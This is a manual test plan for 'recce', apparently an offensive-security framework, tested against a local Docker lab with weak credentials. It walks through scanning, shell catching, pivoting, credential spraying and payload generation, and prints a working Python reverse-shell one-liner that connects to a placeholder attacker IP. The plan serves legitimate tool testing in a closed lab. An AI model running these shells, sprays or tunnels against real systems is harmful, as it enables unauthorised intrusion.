# Recce Test Environment — Manual Test Plan

## Quick Start

```bash
cd test_env
sudo docker-compose up -d --build
# Wait ~30 seconds for all services to initialize
```

Then start recce:
```bash
cd /home/kali/Desktop/projects/recce
python -m recce serve -o test_engagement --port 8443
# Open http://localhost:8443
```

## Target Network (172.20.0.0/24)

| IP           | Hostname      | Services                    | Creds                   |
|------------- |-------------- |---------------------------- |------------------------ |
| 172.20.0.10  | target-linux  | SSH (22)                    | root/toor, testuser/password123 |
| 172.20.0.11  | web-target    | HTTP (80, 8080)             | —                       |
| 172.20.0.12  | db-mysql      | MySQL (3306)                | root/toor, dbuser/dbpass123 |
| 172.20.0.13  | smb-target    | SMB (445), NetBIOS (139)    | smbuser/smbpass123      |
| 172.20.0.14  | ftp-target    | FTP (21)                    | ftpuser/ftppass123      |
| 172.20.0.15  | mail-target   | SMTP (1025), Web UI (8025)  | —                       |
| 172.20.0.16  | win-sim       | RDP-sim (3389), WinRM (5985)| —                       |
| 172.20.0.17  | db-redis      | Redis (6379)                | AUTH redis123           |
| 172.20.0.18  | db-postgres   | PostgreSQL (5432)           | pguser/pgpass123        |

## Test Matrix

### 1. Scanning

#### Quick scan
```bash
python -m recce scan 172.20.0.10-18 -o test_scan --preset quick
```
Expected: Finds SSH, HTTP, MySQL, SMB, FTP, SMTP, RDP, WinRM, Redis, PostgreSQL

#### Standard scan
```bash
python -m recce scan 172.20.0.10-18 -o test_scan --preset standard
```
Expected: Full port sweep, service detection, version info, OS fingerprinting

#### Thorough scan
```bash
python -m recce scan 172.20.0.10-18 -o test_scan --preset thorough
```
Expected: All of standard + UDP top-100, banner scripts, version-all

#### Web scan from UI
- Open the Scan tab → enter `172.20.0.11`
- Verify HTTP content discovery runs
- Check findings appear in Findings tab

### 2. Sessions / Shells

#### Catch a reverse shell (python stager)
```bash
# In recce, start listener on a port (e.g. 4444)
# On target:
ssh root@172.20.0.10 -p 2222  # password: toor
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

#### Catch with recce stager (PTY)
- Copy the stager from the Payloads tab
- SSH into target-linux and run it
- Verify session appears in Sessions tab with PTY

#### Auto-upgrade (raw → PTY)
- Catch a raw shell first (nc/bash)
- Click "Upgrade" in the session card
- Verify it auto-detects python and upgrades

#### Session grouping by host
- Catch 2+ shells from the same host
- Verify they group under one collapsible header

### 3. Port Forwarding

#### Through a session
- Catch a session on target-linux (172.20.0.10)
- In Session Tools → Port Forward tab
- Forward 172.20.0.12:3306 (MySQL) to a local port
- Connect locally: `mysql -h 127.0.0.1 -P <local_port> -u root -ptoor`

#### Preset ports
- Try MySQL, PostgreSQL, Redis presets
- Verify each creates a working forward

### 4. Reverse SOCKS Proxy

#### Start tunnel
- Catch a session on target-linux
- Session Tools → Tunnel tab → Start SOCKS Proxy
- Verify SOCKS5 starts on 127.0.0.1:1080

#### Use through proxychains
```bash
# Edit /etc/proxychains.conf → socks5 127.0.0.1 1080
proxychains nmap -sT -p 3306 172.20.0.12
```

#### Use through browser
- Configure browser SOCKS5 proxy → 127.0.0.1:1080
- Browse to http://172.20.0.11

#### Stop tunnel
- Click Stop → verify agent is killed on target

### 5. Credential Spraying

#### SSH spray
From the UI Credentials/Loot tab:
- Test known creds: root/toor against 172.20.0.10
- Test testuser/password123

#### SMB spray
- Test smbuser/smbpass123 against 172.20.0.13

#### Credential quick-connect
- After a spray hit, use the "Deploy enum" button
- Verify it launches enumeration with those creds

### 6. Payloads

#### One-liners (test on target-linux)
SSH into target-linux and try each:
- Python reverse shell
- Bash /dev/tcp reverse shell
- Python PTY stager (copy from Payloads tab)
- Netcat reverse shell

#### msfvenom generation
- Generate ELF payload from Payloads tab
- Transfer to target, chmod +x, execute
- Verify shell catch (will be raw, not PTY)

### 7. Tool Catalog
- Open Sessions → Tool Catalog tab
- Copy fetch command for linpeas.sh
- SSH into target-linux and run it
- Verify download works

### 8. UI Features

#### Keyboard shortcuts
- Alt+1-9: Switch tabs
- ?: Show shortcut help
- Esc: Dismiss panels

#### Cross-tab navigation
- From Exploitation tab, click a host → verify it goes to Scan
- From Exploitation tab, click "Sessions →"
- From Loot/Credentials, click a host IP

#### Host drawer
- Click a host IP in Findings
- Verify drawer opens with findings, sessions, and scan link

### 9. Deploy (credentialed enum)

```bash
python -m recce deploy test_scan root:toor@172.20.0.10 --enum
```
Expected: Runs enum scripts on target, collects results

## Cleanup

```bash
cd test_env
sudo docker-compose down -v
```
